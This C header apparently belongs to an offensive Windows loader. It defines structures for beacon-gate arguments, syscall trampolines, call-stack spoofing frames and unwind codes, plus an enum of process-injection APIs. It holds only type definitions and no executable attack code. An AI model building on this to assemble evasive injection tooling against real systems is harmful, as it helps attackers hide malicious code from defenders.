#ifndef DEFINITIONS_H
#define DEFINITIONS_H

#include <windows.h>

/* Set to 1 to enable loader dprintf (OutputDebugStringA); use with a debugger to trace stack overflow etc. */
#define LOADER_DEBUG 0

// Order matters: Define constants first
#define MAX_BEACON_GATE_ARGUMENTS 16
#define SIZE_OF_PROXY_STUB         512
#define SIZE_OF_GUARD_EXEC_PICO    1024

// 1. NTAPI Type Definitions
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

// 2. WinApi Enumeration
typedef enum _WinApi {
    INTERNETOPENA,
    INTERNETCONNECTA,
    VIRTUALALLOC,
    VIRTUALALLOCEX,
    VIRTUALPROTECT,
    VIRTUALPROTECTEX,
    VIRTUALFREE,
    GETTHREADCONTEXT,
    SETTHREADCONTEXT,
    RESUMETHREAD,
    CREATETHREAD,
    CREATEREMOTETHREAD,
    OPENPROCESS,
    OPENTHREAD,
    CLOSEHANDLE,
    CREATEFILEMAPPING,
    MAPVIEWOFFILE,
    UNMAPVIEWOFFILE,
    VIRTUALQUERY,
    DUPLICATEHANDLE,
    READPROCESSMEMORY,
    WRITEPROCESSMEMORY,
    EXITTHREAD,
    VIRTUALFREEEX,
    VIRTUALQUERYEX,
    WAITFORSINGLEOBJECT,
    SLEEP
} WinApi;

// 4. Loader and Layout Structures

typedef struct {
    char proxy[SIZE_OF_PROXY_STUB];
    char guardexec[SIZE_OF_GUARD_EXEC_PICO];
} EDEN_LAYOUT;

typedef struct {
    int length;
    char value[];
} _RESOURCE;

typedef struct {
    DWORD len;
    BYTE  value[1];
} RESOURCE;

typedef struct _FRAME_INFO {
    PVOID   ModuleAddress;
    PVOID   FunctionAddress;
    DWORD   Offset;
} FRAME_INFO, * PFRAME_INFO;

typedef struct _SYNTHETIC_STACK_FRAME {
    FRAME_INFO  Frame1;
    FRAME_INFO  Frame2;
    PVOID       pGadget;
} SYNTHETIC_STACK_FRAME, * PSYNTHETIC_STACK_FRAME;

typedef struct _DRAUGR_PARAMETERS {
    PVOID       Fixup;
    PVOID       OriginalReturnAddress;
    PVOID       Rbx;
    PVOID       Rdi;
    PVOID       BaseThreadInitThunkStackSize;
    PVOID       BaseThreadInitThunkReturnAddress;
    PVOID       TrampolineStackSize;
    PVOID       RtlUserThreadStartStackSize;
    PVOID       RtlUserThreadStartReturnAddress;
    PVOID       Ssn;
    PVOID       Trampoline;
    PVOID       Rsi;
    PVOID       R12;
    PVOID       R13;
    PVOID       R14;
    PVOID       R15;
} DRAUGR_PARAMETERS, * PDRAUGR_PARAMETERS;

// 5. Unwinding/Stack Spoofing Structures

typedef struct _STACK_FRAME {
    LPCWSTR    DllPath;
    ULONG      Offset;
    ULONGLONG  TotalStackSize;
    BOOL       RequiresLoadLibrary;
    BOOL       SetsFramePointer;
    PVOID      ReturnAddress;
    BOOL       PushRbp;
    ULONG      CountOfCodes;
    BOOL       PushRbpIndex;
} STACK_FRAME, * PSTACK_FRAME;

typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0,
    UWOP_ALLOC_LARGE,
    UWOP_ALLOC_SMALL,
    UWOP_SET_FPREG,
    UWOP_SAVE_NONVOL,
    UWOP_SAVE_NONVOL_FAR,
    UWOP_SAVE_XMM128 = 8,
    UWOP_SAVE_XMM128_FAR,
    UWOP_PUSH_MACHFRAME
} UNWIND_CODE_OPS, * PUNWIND_CODE_OPS;

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE, * PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, * PUNWIND_INFO;

#endif